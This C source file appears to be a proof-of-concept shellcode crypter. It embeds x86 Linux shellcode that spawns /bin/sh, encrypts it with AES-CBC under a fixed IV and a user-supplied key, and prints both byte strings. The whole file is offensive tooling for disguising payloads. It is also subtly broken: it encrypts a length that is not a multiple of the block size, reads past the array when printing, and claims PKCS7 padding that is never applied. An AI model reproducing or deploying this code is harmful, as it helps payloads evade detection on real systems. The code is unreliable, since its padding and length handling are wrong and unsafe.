#include <stdio.h>
#include <stdint.h>	// uint8_t for shellcode, key, and iv
#include <string.h>	// strlen

#define CBC 1
#define ECB 0
#define CTR 0

#include "aes.h"	// tiny AES


// our shellcode can be represented with an array of unsigned integers of length 8 bits (1 byte each aka bytecode).. http://www.gnu.org/software/libc/manual/html_node/Integers.html
uint8_t sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Since this is a PoC, no need to worry about IV randomization.  Just trying to get a working version right now.
void encrypt(char* encryptKey, uint32_t length)
{
	// initializations:
	//	context 	--> struct AES_ctx
	//	iv		--> uint8_t 

	struct AES_ctx ctx;
	char *iv = "a83lLkdfndi20did";
 
	AES_init_ctx_iv(&ctx, (uint8_t*)encryptKey,(uint8_t*)iv);

	AES_CBC_encrypt_buffer(&ctx, sc, length);

}

main(int argc, char* argv[])
{
	if(strlen(argv[1]) != 32){
		printf("Make the key 32 bytes");
		return 0;
	}
	char *encryptKey = argv[1];
	uint32_t sc_len = sizeof(sc)-1;

	printf("Orig Shellcode:\n");
	for(int i = 0; i < sc_len; i++)
	{
		printf("\\x%02X", sc[i]);

	}
	printf("\n\n");

	encrypt(encryptKey, sc_len);
	
	// quick search shows us how to calculate ciphertext length after padding (16 bit blocks with PKCS7)
	// https://crypto.stackexchange.com/questions/54017/can-we-calculate-aes-ciphertext-length-based-on-the-length-of-the-plaintext
	uint32_t enc_sc_len = sc_len + (16 - (sc_len % 16));

	printf("Encrypted Shellcode:\n");

	for(int i = 0; i < enc_sc_len; i++)
	{
		printf("\\x%02X", sc[i]);

	}	
	printf("\n");

	return 0;
}
